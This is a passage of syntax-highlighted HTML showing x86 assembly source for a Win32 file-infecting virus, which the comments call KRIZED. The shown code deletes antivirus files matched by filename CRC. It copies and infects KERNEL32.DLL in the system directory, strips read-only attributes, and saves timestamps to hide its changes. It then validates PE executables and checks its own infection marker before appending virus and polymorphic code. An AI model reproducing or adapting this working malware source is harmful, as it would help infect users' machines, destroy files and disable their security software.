        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">         </span><span class="sc1">; Perhaps a screen-saver?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Free_Glo_M</span><span class="sc0">

</span><span class="sc5">Calc_CRC_Name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Calculate_CRC16</span><span class="sc0">         </span><span class="sc1">; Calculate filename's CRC.</span><span class="sc0">

        </span><span class="sc1">; Kill AV-files.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Kill_Table</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">Kill_CRC_Count</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Payload_Test</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc1">; Prevent any Happy99 alike</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; 'protection'.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Later dude..</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixDeleteFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Payload_Test</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_For_Payload</span><span class="sc0">       </span><span class="sc1">; Activate?</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Free_Global_M</span><span class="sc4">-</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">Infect_Mode</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc1">; Obtain the path to the Windoze system-directory,</span><span class="sc0">
        </span><span class="sc1">; which is most likely C:\WINDOWS\SYSTEM.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">Clean_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetSystemDirectoryA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">Infected_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Offset_Inf_K32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

        </span><span class="sc1">; Append the temporary virus filename to the</span><span class="sc0">
        </span><span class="sc1">; system-path, ie. C:\WINDOWS\SYSTEM\KRIZED.TT6.</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infected_K32</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">

        </span><span class="sc1">; Append the original kernel filename to the</span><span class="sc0">
        </span><span class="sc1">; system-path, ie. C:\WINDOWS\SYSTEM\KERNEL32.DLL.</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">KERNEL32_Name</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

    </span><span class="sc1">; In the system-dir, copy KERNEL32.DLL to KRIZED.TT6.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">Infected_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">Clean_K32_Path</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCopyFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Any problems doing it?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Free_Global_M</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Clear_Tracks_Sw</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">Open_Candidate</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">27</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Umm.. get it's attribs?</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Ack, error.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Clear_Tracks</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Restore return value.</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">; Readonly my ass..</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Strip readonly-flag.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Test for error.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Attr</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Open the candidate-file.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Attr</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Global_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Time_Last_Write</span><span class="sc4">-</span><span class="sc5">Virus_End</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Fetch it's time-stamps.</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetFileTime</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Map whole file.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Standard security.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Stamp</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixMapViewOfFile</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Mapping</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetFileSize</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">               </span><span class="sc1">; Avoid too small files.</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.MZ_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; It must be an .EXE-file.</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.MZ_Reloc_Table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; External header present?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Obtain pointer PE-header.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; PE-header is really there?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc1">; Only infect 80386/80486/80586-files.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.CPU_Type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14Ch</span><span class="sc0">    </span><span class="sc1">; 80386 compatibility?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.CPU_Type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14Eh</span><span class="sc0">    </span><span class="sc1">; 80586 compatibility?</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Mode</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Check_Our_Mark</span><span class="sc0">

        </span><span class="sc1">; Don't infect non-K32 DLL's.</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.PE_Flags</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Abort_Checks</span><span class="sc0">

</span><span class="sc5">Check_Our_Mark</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Object_Count</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.NT_Header_Size</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_Flags</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010000b</span><span class="sc0">           </span><span class="sc1">; Strip all but our own</span><span class="sc0">
                        </span><span class="sc1">; flags.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11010000b</span><span class="sc0">           </span><span class="sc1">; Already infected? (R/W/S).</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc1">; Calculate physical size after infection.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_Physical_Offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Section_Physical_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Poly_Size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.File_Align</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                </span><span class="sc1">; Host increases in size?</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">     </span><span class="sc5">Set_Inf_Size</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Don't resize if not.</span><span class="sc0">

</span><span class="sc5">Set_Inf_Size</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infected_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Mark as a valid candidate.</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Abort_Checks</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; Just a lame anti-?</span><span class="sc0">

</span><span class="sc5">Abort_Checks</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Address</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixUnmapViewOfFile</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Map_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixCloseHandle</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Valid host?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Restore_Stamp</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
